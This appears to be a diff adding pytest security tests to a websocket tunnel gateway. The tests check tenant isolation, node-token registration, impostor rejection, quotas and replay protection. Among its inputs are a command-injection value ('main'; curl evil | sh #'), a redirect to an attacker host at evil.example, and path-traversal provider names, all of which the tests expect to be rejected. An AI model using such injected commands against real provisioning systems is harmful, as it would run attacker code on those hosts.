@@ -13,7 +13,8 @@ pytest.importorskip("websockets")
 import websockets  # noqa: E402
 from gateway.claims import Claims  # noqa: E402
 from gateway.client import GatewayClient  # noqa: E402
-from gateway.protocol import dec, derive_keys, enc, proof  # noqa: E402
+from gateway.protocol import (TO_LISTENER, AgentConn, dec, derive_keys, enc,  # noqa: E402
+                              node_proof, proof, session_key)
 from gateway.server import Gateway  # noqa: E402
 
 SECRET = "gw-secret"
@@ -48,12 +49,18 @@ async def _stop_echo(server):
     await asyncio.wait_for(server.wait_closed(), timeout=5)
 
 
-async def _server_agent(ws_url, target_port, node_id):
-    """A stand-in for the open `rixi-tunnel connect` (auth with node_id, role=server)."""
+async def _server_agent(ws_url, target_port, node_id, node_token=""):
+    """A stand-in for the open `rixi-tunnel connect` (auth with node_id, role=server). A box the
+    gateway provisioned also proves the registration token it was given."""
     key, _pk = derive_keys(SECRET)
     ws = await websockets.connect(ws_url)
     ch = dec(await ws.recv(), key)
-    await ws.send(enc({"type": "auth", "proof": proof(_pk, ch["nonce"]), "node_id": node_id}, key))
+    mine = os.urandom(16).hex()
+    auth = {"type": "auth", "proof": proof(_pk, ch["nonce"]), "node_id": node_id, "nonce": mine}
+    if node_token:
+        auth["node_proof"] = node_proof(node_token, ch["nonce"], mine)
+    await ws.send(enc(auth, key))
+    conn = AgentConn(ws, session_key(key, ch["nonce"], mine, node_token), sends=TO_LISTENER)
     sessions = {}
 
     async def pump(sid, reader):
@@ -62,14 +69,14 @@ async def _server_agent(ws_url, target_port, node_id):
                 d = await reader.read(65536)
                 if not d:
                     break
-                await ws.send(enc({"type": "session_data", "sid": sid,
-                                   "data": base64.b64encode(d).decode()}, key))
+                await conn.send({"type": "session_data", "sid": sid,
+                                 "data": base64.b64encode(d).decode()})
         finally:
             sessions.pop(sid, None)
 
     async def loop():
         async for raw in ws:
-            o = dec(raw, key)
+            o = conn.open(raw)
             if o["type"] == "session_open":
                 r, w = await asyncio.open_connection("127.0.0.1", target_port)
                 sessions[o["sid"]] = w
@@ -87,7 +94,7 @@ async def _server_agent(ws_url, target_port, node_id):
 
 
 async def _start_gateway():
-    gw = Gateway(SECRET, "127.0.0.1", 0)
+    gw = Gateway(SECRET, "127.0.0.1", 0, node_secret="only-the-gateway-knows")
     ws_server = await websockets.serve(gw._on_agent, "127.0.0.1", 0, ping_interval=20)
     return gw, ws_server, f"ws://127.0.0.1:{ws_server.sockets[0].getsockname()[1]}"
 
@@ -151,7 +158,7 @@ def test_claim_redemption_signals_waiting_client():
             # a claim is pending for client C (as request_compute would create)
             claim = gw.claims.create("C", "dummy", {})
             # the provisioned server dials in using the token as its node_id
-            sa = await _server_agent(url, ep, claim.token)
+            sa = await _server_agent(url, ep, claim.token, gw.node_token(claim.token))
             assert await _wait(lambda: ca.ready.is_set())
             assert ca.ready_node == claim.token
             assert gw.claims.get(claim.token).status == "active"
@@ -209,3 +216,219 @@ def test_claims_token_lifecycle():
     time.sleep(0.1)
     assert expiring.expired
     assert c.redeem(expiring.token, expiring.token) is None
+
+
+# ── clients and boxes are kept apart ─────────────────────────────────────────
+
+class _Gw:
+    """A gateway with clients and agents, cleaned up at the end."""
+
+    async def __aenter__(self):
+        self.echo, self.ep = await _echo(b"S:")
+        self.gw, self.ws_server, self.url = await _start_gateway()
+        self.clients, self.agents = [], []
+        return self
+
+    async def client(self, name):
+        c = GatewayClient(self.url, SECRET, name)
+        await c.connect()
+        self.clients.append(c)
+        return c
+
+    async def agent(self, node_id, node_token=""):
+        a = await _server_agent(self.url, self.ep, node_id, node_token)
+        self.agents.append(a)
+        return a
+
+    async def __aexit__(self, *exc):
+        for c in self.clients:
+            if c._loop_task:
+                c._loop_task.cancel()
+        for ws, task in self.agents:
+            task.cancel()
+            await ws.close()
+        self.ws_server.close()
+        await self.ws_server.wait_closed()
+        await _stop_echo(self.echo)
+
+
+async def _reaches(client, node_id) -> bool:
+    """Whether a session the client opens to `node_id` is bridged to a box."""
+    local, port = await client.serve_local(node_id, "127.0.0.1", 0)
+    try:
+        r, w = await asyncio.open_connection("127.0.0.1", port)
+        w.write(b"hi")
+        await w.drain()
+        try:
+            return await asyncio.wait_for(r.read(4), timeout=1.5) == b"S:hi"
+        except asyncio.TimeoutError:
+            return False
+        finally:
+            w.close()
+    finally:
+        local.close()
+        await local.wait_closed()
+
+
+def test_a_box_somebody_asked_for_is_theirs_alone():
+    async def run():
+        async with _Gw() as t:
+            alice, mallory = await t.client("alice"), await t.client("mallory")
+            assert await _wait(lambda: t.gw.registry.get("mallory") is not None)
+            claim = t.gw.claims.create("alice", "dummy", {})
+            await t.agent(claim.token, t.gw.node_token(claim.token))
+            assert await _wait(lambda: alice.ready.is_set())
+            # the claim token is what reaches the box: nobody else is told it
+            assert claim.token in {n["node_id"] for n in await alice.list_nodes()}
+            seen = {n["node_id"] for n in await mallory.list_nodes()}
+            assert claim.token not in seen and "alice" not in seen and "mallory" in seen
+            assert await _reaches(alice, claim.token)
+            # … and even with the token (say, from a log), it is not theirs to use or end
+            assert not await _reaches(mallory, claim.token)
+            assert (await mallory._control("route", node_id=claim.token))["exists"] is False
+            assert (await mallory._control("release", token=claim.token))["released"] is False
+            assert t.gw.claims.get(claim.token).status == "active"
+            assert (await alice._control("release", token=claim.token))["released"] is True
+    asyncio.run(run())
+
+
+def test_only_the_provisioned_box_registers_under_its_name():
+    async def run():
+        async with _Gw() as t:
+            from gateway.config import ResourceDef
+            t.gw.catalog["gpu"] = ResourceDef(name="gpu", provider="dummy", reuse=True)
+            claim = t.gw.claims.create("alice", "dummy", {})
+            # another holder of the tunnel secret (any box, any client) tries the names
+            await t.agent("res-gpu")
+            await t.agent("res-gpu", "f" * 64)
+            await t.agent(claim.token)
+            await t.agent("rxtok_made_up", t.gw.node_token("rxtok_made_up"))
+            await asyncio.sleep(0.3)
+            assert t.gw.registry.list("server") == [] and claim.status == "pending"
+            await t.agent("res-gpu", t.gw.node_token("res-gpu"))
+            assert await _wait(lambda: t.gw.registry.get("res-gpu") is not None)
+            # a token is for one node id only
+            await t.agent(claim.token, t.gw.node_token("res-gpu"))
+            await asyncio.sleep(0.2)
+            assert t.gw.registry.get(claim.token) is None
+    asyncio.run(run())
+
+
+def test_nobody_takes_the_place_of_a_node_that_is_connected():
+    async def run():
+        async with _Gw() as t:
+            await t.agent("node-Z")
+            alice = await t.client("alice")
+            assert await _wait(lambda: t.gw.registry.get("alice") is not None)
+            first_box, first_client = t.gw.registry.get("node-Z").conn, t.gw.registry.get("alice").conn
+            await t.agent("node-Z")                       # an impostor box
+            impostor = GatewayClient(t.url, SECRET, "alice")      # an impostor client
+            await impostor.connect()
+            t.clients.append(impostor)
+            await t.client("res-gpu")                     # a client under a box's kind of name
+            await asyncio.sleep(0.3)
+            assert t.gw.registry.get("node-Z").conn is first_box
+            assert t.gw.registry.get("alice").conn is first_client
+            assert t.gw.registry.get("res-gpu") is None
+            assert await _reaches(alice, "node-Z")        # still the real one
+    asyncio.run(run())
+
+
+def test_a_client_names_a_provider_not_a_path_and_not_the_gateways_own_host():
+    async def run():
+        async with _Gw() as t:
+            alice = await t.client("alice")
+            t.gw.allow_dummy = False
+            for provider in ("../..", "/", "../../../../tmp", "Dummy", "no-such", ""):
+                with pytest.raises(RuntimeError, match="unknown provider"):
+                    await alice._control("request_compute", provider=provider, spec={})
+            with pytest.raises(RuntimeError, match="dummy provider"):
+                await alice._control("request_compute", provider="dummy", spec={})
+            assert t.gw.claims.list() == []
+            # what a client may choose about its box, and what it may not
+            provisioned = []
+
+            async def fake(name, args):
+                provisioned.append(args)
+                return {}
+            t.gw.fire_action = fake
+            t.gw.allow_dummy = True
+            await alice._control("request_compute", provider="dummy", spec={
+                "python_bin": "/tmp/evil", "rixi_dir": "/tmp/evil", "region": "fr-par",
+                "gateway_ws_url": "ws://evil.example:1", "instance_type": "DEV1-S"})
+            assert await _wait(lambda: provisioned)
+            assert provisioned[0]["spec"] == {"region": "fr-par", "instance_type": "DEV1-S"}
+            with pytest.raises(RuntimeError, match="not allowed"):
+                await alice._control("request_compute", provider="dummy",
+                                     spec={"rixi_ref": "main'; curl evil | sh #"})
+    asyncio.run(run())
+
+
+def test_the_gateways_own_settings_stay_out_of_a_dummy_box():
+    from gateway.actions.provision import _module, _provider_vars
+    out = _provider_vars("dummy", {"python_bin": "/tmp/evil", "rixi_dir": "/tmp/evil"})
+    assert out["python_bin"] == sys.executable and "/tmp/evil" not in out.values()
+    for bad in ("../..", "/etc", "a/b", ""):
+        with pytest.raises(RuntimeError, match="unknown provider"):
+            _module(bad)
+
+
+def test_boxes_asked_for_by_provider_count_toward_quotas_and_budget():
+    from gateway.auth import Identity
+    from gateway.config import parse_global_policy
+    from gateway.policy import PolicyEngine, UsageView
+    engine = PolicyEngine(parse_global_policy({
+        "quotas": {"max_concurrent_resources": 2, "max_eur_per_hour": 1.0},
+        "roles": {"user": {"allowed_ops": ["request_compute", "list"]}}}), {})
+    bob = Identity(sub="bob", roles=("user",))
+    ask = dict(request={"provider": "scaleway", "instance_type": "L4-1-24G"})
+    assert engine.evaluate(bob, "request_compute", **ask, usage=UsageView()).allow
+    assert not engine.evaluate(bob, "request_compute", **ask,
+                               usage=UsageView(per_identity_boxes={"bob": 2})).allow
+    assert not engine.evaluate(bob, "request_compute", **ask,
+                               usage=UsageView(fleet_eur_per_hour=0.9)).allow
+    # a caller whose role the policy does not define has no permissions, not all of them
+    stranger = Identity(sub="eve", roles=("intern",))
+    lax = PolicyEngine(parse_global_policy({
+        "default_role": "guest", "roles": {"user": {"allowed_ops": ["list"]}}}), {})
+    for op in ("teardown", "request_compute", "list"):
+        assert not lax.evaluate(stranger, op).allow, op
+
+    async def run():
+        async with _Gw() as t:
+            t.gw.claims.create("alice", "scaleway", {"instance_type": "L4-1-24G"})
+            usage = t.gw._usage()
+            assert usage.per_identity_boxes == {"alice": 1} and usage.fleet_eur_per_hour > 0
+    asyncio.run(run())
+
+
+def test_a_recorded_connection_cannot_be_played_back():
+    from gateway.protocol import TO_DIALER, seal, unseal
+    key = session_key(derive_keys(SECRET)[0], "a" * 32, "b" * 32)
+    frames = [seal({"type": "session_data", "sid": "s", "data": str(i)}, key, TO_LISTENER, i)
+              for i in range(3)]
+    assert [unseal(f, key, TO_LISTENER, i)["data"] for i, f in enumerate(frames)] == ["0", "1", "2"]
+    with pytest.raises(Exception):
+        unseal(frames[0], key, TO_LISTENER, 1)             # played again
+    with pytest.raises(Exception):
+        unseal(frames[2], key, TO_LISTENER, 1)             # out of order (one was dropped)
+    with pytest.raises(Exception):
+        unseal(frames[0], key, TO_DIALER, 0)               # fed back to the side that sent it
+    other = session_key(derive_keys(SECRET)[0], "c" * 32, "b" * 32)   # a later connection
+    with pytest.raises(Exception):
+        unseal(frames[0], other, TO_LISTENER, 0)
+    # a node's own token keeps others who hold the shared secret out of its connection
+    assert session_key(derive_keys(SECRET)[0], "a" * 32, "b" * 32, "tok") != key
+
+    async def run():
+        async with _Gw() as t:
+            # an agent of the older protocol (no connection nonce) is not registered
+            k, pk = derive_keys(SECRET)
+            ws = await websockets.connect(t.url)
+            ch = dec(await ws.recv(), k)
+            await ws.send(enc({"type": "auth", "proof": proof(pk, ch["nonce"]),
+                               "node_id": "old"}, k))
+            await asyncio.sleep(0.3)
+            assert t.gw.registry.get("old") is None
+            await ws.close()
+    asyncio.run(run())
